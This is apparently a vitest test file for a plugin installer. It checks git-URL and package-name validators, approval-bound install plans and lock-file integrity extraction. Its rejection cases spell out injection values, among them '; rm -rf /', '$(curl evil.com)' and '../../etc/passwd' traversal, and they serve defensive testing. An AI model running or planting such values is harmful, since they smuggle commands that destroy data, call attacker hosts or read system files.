/**
 * Coverage for the plugin-install input validators assertValidGitUrl /
 * assertValidPackageName (#8801 / #9943). A malicious git URL or package name
 * fed to the installer is a remote-code-execution vector, so these pure,
 * deterministic checks must reject shell injection, SSH URLs, and path
 * traversal. No network or child process is touched.
 */
import fs from "node:fs/promises";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  assertValidGitUrl,
  assertValidPackageName,
  extractBunLockProvenance,
  extractNpmLockProvenance,
  installPlugin,
  resolvePluginInstallPlan,
} from "./plugin-installer";
import * as registryClient from "./registry-client.ts";
import type { RegistryPluginInfo } from "./registry-client-types.ts";

afterEach(() => {
  vi.restoreAllMocks();
});

function registryInfo(
  overrides: Partial<RegistryPluginInfo> = {},
): RegistryPluginInfo {
  return {
    name: "Friendly Plugin Name",
    gitRepo: "example/plugin-repository",
    gitUrl: "https://github.com/example/plugin-repository.git",
    description: "fixture",
    homepage: null,
    topics: [],
    stars: 0,
    language: "TypeScript",
    npm: {
      package: "@vendor/canonical-plugin",
      v0Version: null,
      v1Version: null,
      v2Version: "2.4.1",
    },
    git: {
      v0Branch: null,
      v1Branch: null,
      v2Branch: "main",
    },
    supports: { v0: false, v1: false, v2: true },
    ...overrides,
  };
}

describe("assertValidGitUrl", () => {
  it("accepts a well-formed https .git URL", () => {
    expect(() =>
      assertValidGitUrl("https://github.com/elizaos/eliza.git"),
    ).not.toThrow();
    expect(() =>
      assertValidGitUrl("https://gitlab.com/group/sub/repo.git"),
    ).not.toThrow();
  });

  it("rejects non-https, missing .git, SSH, and injection attempts", () => {
    for (const u of [
      "http://github.com/x.git",
      "https://github.com/x",
      "git@github.com:x/y.git",
      "https://github.com/x.git; rm -rf /",
      "https://$(curl evil.com).git",
      "https://github.com/x.git evil",
    ]) {
      expect(() => assertValidGitUrl(u)).toThrow(/Invalid git URL/);
    }
  });
});

describe("assertValidPackageName", () => {
  it("accepts plain and scoped package names", () => {
    for (const n of [
      "lodash",
      "plugin-foo",
      "@elizaos/plugin-bar",
      "@scope/name.sub",
    ]) {
      expect(() => assertValidPackageName(n)).not.toThrow();
    }
  });

  it("rejects traversal, injection, and malformed scopes", () => {
    for (const n of [
      "../../etc/passwd",
      "foo/bar",
      "foo; rm -rf /",
      "@/missing-scope",
      ".hidden",
      "name with space",
    ]) {
      expect(() => assertValidPackageName(n)).toThrow(/Invalid package name/);
    }
  });
});

describe("resolvePluginInstallPlan", () => {
  it("installs the registry canonical npm package instead of its display name", () => {
    expect(resolvePluginInstallPlan(registryInfo())).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.4.1",
      approvalBound: false,
    });
  });

  it("preserves the legacy positional requested-version contract", () => {
    expect(resolvePluginInstallPlan(registryInfo(), "2.3.0")).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.3.0",
      approvalBound: false,
    });
  });

  it("binds an approved canonical package and exact version", () => {
    expect(
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "2.4.1",
        },
      }),
    ).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.4.1",
      approvalBound: true,
    });
  });

  it("rejects package and version approval drift", () => {
    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@attacker/replacement",
          version: "2.4.1",
        },
      }),
    ).toThrow(/does not match registry package/);

    expect(() =>
      resolvePluginInstallPlan(
        registryInfo({
          npm: {
            package: "@vendor/canonical-plugin",
            v0Version: null,
            v1Version: null,
            v2Version: "2.4.2",
          },
        }),
        {
          expected: {
            packageName: "@vendor/canonical-plugin",
            version: "2.4.1",
          },
        },
      ),
    ).toThrow(/does not match registry version/);

    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        version: "2.4.2",
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "2.4.1",
        },
      }),
    ).toThrow(/does not match approved version/);
  });

  it("rejects dist-tags and invalid canonical registry packages in bound plans", () => {
    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "next",
        },
      }),
    ).toThrow(/exact semantic version/);

    expect(() =>
      resolvePluginInstallPlan(
        registryInfo({
          npm: {
            package: "Friendly Plugin Name",
            v0Version: null,
            v1Version: null,
            v2Version: "2.4.1",
          },
        }),
      ),
    ).toThrow(/invalid canonical npm package/);
  });
});

describe("installPlugin approval boundary", () => {
  it("rejects approval drift before creating the install directory", async () => {
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(registryInfo());
    const mkdir = vi.spyOn(fs, "mkdir");

    const result = await installPlugin("friendly-registry-alias", undefined, {
      expected: {
        packageName: "@attacker/replacement",
        version: "2.4.1",
      },
    });

    expect(result).toMatchObject({
      success: false,
      error: expect.stringMatching(/does not match registry package/),
    });
    expect(mkdir).not.toHaveBeenCalled();
  });
});

describe("package-manager lock provenance", () => {
  it("extracts npm resolved URL and SRI for the canonical package", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "node_modules/@vendor/canonical-plugin": {
              version: "2.4.1",
              resolved:
                "https://registry.npmjs.org/@vendor/canonical-plugin/-/canonical-plugin-2.4.1.tgz",
              integrity: "sha512-YXBwcm92ZWQ=",
            },
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({
      resolved:
        "https://registry.npmjs.org/@vendor/canonical-plugin/-/canonical-plugin-2.4.1.tgz",
      integrity: "sha512-YXBwcm92ZWQ=",
    });
  });

  it("extracts Bun SRI without fabricating an unavailable tarball URL", () => {
    expect(
      extractBunLockProvenance(
        {
          packages: {
            "@vendor/canonical-plugin": [
              "@vendor/canonical-plugin@2.4.1",
              "",
              {},
              "sha512-YXBwcm92ZWQ=",
            ],
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({ resolved: null, integrity: "sha512-YXBwcm92ZWQ=" });
  });

  it("returns null when the selected package has no lock provenance", () => {
    expect(extractNpmLockProvenance({}, "@vendor/missing")).toBeNull();
    expect(extractBunLockProvenance({}, "@vendor/missing")).toBeNull();
  });

  it("does not expose malformed strings as verified package integrity", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "node_modules/@vendor/canonical-plugin": {
              integrity: "not-an-sri",
            },
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({ resolved: null, integrity: null });
  });
});
